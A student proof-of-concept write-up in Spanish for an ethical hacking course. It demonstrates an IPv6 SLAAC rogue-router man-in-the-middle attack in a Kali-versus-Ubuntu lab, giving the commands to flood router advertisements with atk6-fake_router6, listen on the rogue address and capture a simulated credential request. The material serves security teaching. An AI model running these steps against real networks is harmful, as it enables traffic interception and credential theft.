# PoC: Ataque SLAAC (IPv6 Rogue Router)

**Autor:** Pablo A.

**Asignatura:** Hacking Ético

**Fecha:** Diciembre 2025

---

## 1. Descripción del Proyecto.
Este proyecto demuestra una **Prueba de Concepto (PoC)** sobre la vulnerabilidad **SLAAC (Stateless Address Autoconfiguration)** en redes IPv6. 

El ataque consiste en introducir un **"Rogue Router"** (Router falso) en la red que envía paquetes *Router Advertisement* (RA) maliciosos. Esto provoca que los dispositivos víctimas se autoconfiguren automáticamente con una dirección IPv6 y una puerta de enlace controlada por el atacante, permitiendo un ataque **Man-in-the-Middle (MITM)** y la intercepción de tráfico.

## 2. Entorno y Herramientas.

* **Máquina Atacante:** Kali Linux
    * `thc-ipv6` (Herramienta `atk6-fake_router6`)
    * `python3` (Módulo `http.server`)
    * `Wireshark`
* **Máquina Víctima:** Ubuntu 22.04
* **Red:** Configuración de red local (LAN) compartida.

---

## 3. Procedimiento del Ataque.

### Paso 1: Preparación del Atacante.
Primero, instalamos las herramientas necesarias en Kali Linux y nos asignamos una IP estática dentro del rango malicioso que vamos a inyectar (`2001:1234::/64`) para actuar como gateway.

#### 1. Instalación de la suite thc-ipv6:
```bash
sudo apt update && sudo apt install thc-ipv6
```
#### 2. Asignación manual de la IP del router falso:
```bash
sudo ip -6 addr add 2001:1234::1/64 dev eth0
```


### Paso 2: Despliegue del Rogue Router.
Lanzamos el ataque de inundación de paquetes RA. Esto hace que todos los equipos de la red acepten nuestro prefijo `2001:1234::` y nos configuren como su router IPv6 por defecto.

#### Comando para iniciar el anuncio de router falso:
```bash
sudo atk6-fake_router6 eth0 2001:1234::/64
```


### Paso 3: Verificación en la Víctima (Infección).
En la máquina víctima (Ubuntu), comprobamos que el ataque ha tenido éxito. 

#### Revisión de la interfaz obtenida:
```bash
ip a
```
Al ejecutar `ip a`, observamos que la interfaz ha recibido automáticamente una dirección global del rango `2001:1234...` mediante SLAAC.



## 4. Captura de Credenciales (PoC).
Para demostrar el riesgo crítico de esta vulnerabilidad, levantamos un servidor web falso en el atacante y simulamos una conexión de la víctima.

### Paso 1: Servidor de escucha.
En el Atacante (Kali): Levantamos un servidor escuchando específicamente en la IP maliciosa:
```bash
sudo python3 -m http.server 80 --bind 2001:1234::1
```

### Paso 2: Wireshark.
En nuestra máquina Atacante (Kali) podemos también dejar Wireshark funcionando de fondo con un filtro http.
```bash
sudo wireshark -i eth0 -k -Y http
```

### Paso 3: Simulación de envío de credenciales.
En la Víctima (Ubuntu): Simulamos el envío de credenciales mediante una petición HTTP:
```bash
wget "[http://[2001:1234::1]/login?usuario=admin&pass=capturado](http://[2001:1234::1]/login?usuario=admin&pass=capturado)"
```
o
```bash
firefox "http://[2001:1234::1]/login?usuario=admin&pass=capturado"
```
